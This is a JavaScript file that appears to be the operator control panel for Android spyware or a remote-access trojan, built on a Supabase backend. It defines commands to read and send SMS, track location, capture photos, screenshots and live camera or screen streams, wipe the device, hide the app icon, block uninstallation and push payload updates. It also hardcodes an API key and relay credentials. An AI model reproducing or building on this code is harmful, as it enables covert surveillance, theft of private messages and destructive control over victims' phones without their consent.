const SUPABASE_URL = "https://envymntjecsgixofegbq.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVudnltbnRqZWNzZ2l4b2ZlZ2JxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MjQ5MzMsImV4cCI6MjA5MjIwMDkzM30.lxdxROh5IptFB7cOnRGjLQomX_KvrJly4CNIKN0-cuc";
const ADMIN_EMAILS = ["admin@dexsocy.com"];

const CMD = {
    LOCK: "lock",
    UNLOCK: "unlock",
    STOP_STREAM: "stop_stream",
    SCREENSHOT: "screenshot",
    CHECK_PERMS: "check_perms",
    CAMERA_FRONT: "camera_front",
    CAMERA_BACK: "camera_back",
    LOCATION: "location",
    SMS_LIST: "sms_list",
    SMS_SEND: "send_sms",
    VIBRATE: "vibrate",
    TOAST: "toast",
    WIPE: "wipe",
    ANTI_UNINSTALL: "anti_uninstall",
    HIDE_ICON: "hide_icon",
    FLASH: "flash",
    REQ_PERM: "request_perm",
    LOAD_MODULE: "load_module",
    UPDATE_PAYLOAD: "update_payload"
};

const RTC_CONFIG = {
    iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
        { urls: "stun:stun2.l.google.com:19302" },
        { urls: "stun:stun3.l.google.com:19302" },
        { urls: "stun:stun4.l.google.com:19302" },
        { urls: "stun:stun.cloudflare.com:3478" },
        { urls: "stun:stun.services.mozilla.com" }
    ],
    iceCandidatePoolSize: 10,
    bundlePolicy: "max-bundle",
    rtcpMuxPolicy: "require",
    sdpSemantics: "unified-plan"
};

const FALLBACK_TURN = [
    {
        urls: [
            "turn:global.relay.metered.ca:80",
            "turn:global.relay.metered.ca:443",
            "turn:global.relay.metered.ca:443?transport=tcp",
            "turns:global.relay.metered.ca:443?transport=tcp"
        ],
        username: "33500225b9105e9ce477d7f4",
        credential: "97UioiShU85IkOua"
    }
];
const TOAST_MS = 3200;
const TOAST_EXIT_MS = 260;
const MODAL_EXIT_MS = 260;

const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
    auth: { persistSession: false }
});

const state = {
    auth: {
        user: null,
        isAdmin: false
    },
    ui: {
        loading: false,
        view: "devices",
        modal: null,
        toasts: [],
        logs: []
    },
    data: {
        devices: [],
        selectedDeviceId: null,
        selectedDevice: null,
        controlStatesByDevice: {}
    },
    stream: {
        active: false,
        mode: null,
        token: 0,
        status: "idle",
        withAudio: false
    }
};

const dom = {};
const VIEW_ORDER = ["devices", "system", "remote", "logs"];

const REMOTE_ACTIONS = [
    { icon: "message-square", label: "Read Messages", type: "command", value: CMD.SMS_LIST },
    { icon: "map-pin", label: "Track Location", type: "command", value: CMD.LOCATION },
    { icon: "bell", label: "Send Toast", type: "modal", value: CMD.TOAST },
    { key: "lock", type: "toggle-command" },
    { key: "flashlight", type: "toggle-command" },
    { icon: "smartphone", label: "Vibrate Device", type: "command", value: CMD.VIBRATE }
];

const MEDIA_ACTIONS = [
    { icon: "camera", label: "Take Photo", type: "take-photo-setup", value: "" },
    { icon: "video", label: "Video Live", type: "stream", value: CMD.CAMERA_BACK },
    { icon: "monitor-smartphone", label: "Screenshot", type: "command", value: CMD.SCREENSHOT },
    { icon: "monitor", label: "Screen Mirror", type: "stream", value: "screen" }
];

const SYSTEM_ACTIONS = [
    { icon: "refresh-ccw", label: "Update Payload", type: "command", value: CMD.UPDATE_PAYLOAD },
    { key: "hideIcon", type: "toggle-command" },
    { key: "antiUninstall", type: "toggle-command" },
    { icon: "refresh-cw", label: "Refresh Device", type: "refresh-device", value: "" }
];

const PERMISSION_ACTIONS = [
    { icon: "shield-check", label: "Grant All Access", type: "command", value: `${CMD.REQ_PERM}:all`, permKey: "permissions_granted" },
    { icon: "message-square", label: "SMS Access", type: "command", value: `${CMD.REQ_PERM}:sms`, permKey: "sms" },
    { icon: "map-pin", label: "Location Access", type: "command", value: `${CMD.REQ_PERM}:location`, permKey: "location" },
    { icon: "camera", label: "Camera Access", type: "command", value: `${CMD.REQ_PERM}:camera`, permKey: "camera" },
    { icon: "mic", label: "Microphone Access", type: "command", value: `${CMD.REQ_PERM}:mic`, permKey: "mic" }
];

const TOGGLE_ACTIONS = {
    lock: {
        stateKey: "locked",
        defaultValue: false,
        on: {
            icon: "lock",
            label: "Device Locked",
            command: CMD.UNLOCK
        },
        off: {
            icon: "lock-open",
            label: "Device Unlocked",
            command: CMD.LOCK
        }
    },
    flashlight: {
        stateKey: "flashlightOn",
        defaultValue: false,
        on: {
            icon: "flashlight",
            label: "Flashlight",
            command: CMD.FLASH + "_off"
        },
        off: {
            icon: "flashlight-off",
            label: "Flashlight",
            command: CMD.FLASH + "_on"
        }
    },
    hideIcon: {
        stateKey: "iconHidden",
        defaultValue: false,
        on: {
            icon: "eye-off",
            label: "Hide App Icon",
            command: CMD.HIDE_ICON + ":off"
        },
        off: {
            icon: "eye",
            label: "Hide App Icon",
            command: CMD.HIDE_ICON + ":on"
        }
    },
    antiUninstall: {
        stateKey: "antiUninstall",
        defaultValue: false,
        on: {
            icon: "shield",
            label: "Anti Uninstall",
            command: CMD.ANTI_UNINSTALL + ":off"
        },
        off: {
            icon: "shield-off",
            label: "Anti Uninstall",
            command: CMD.ANTI_UNINSTALL + ":on"
        }
    }
};
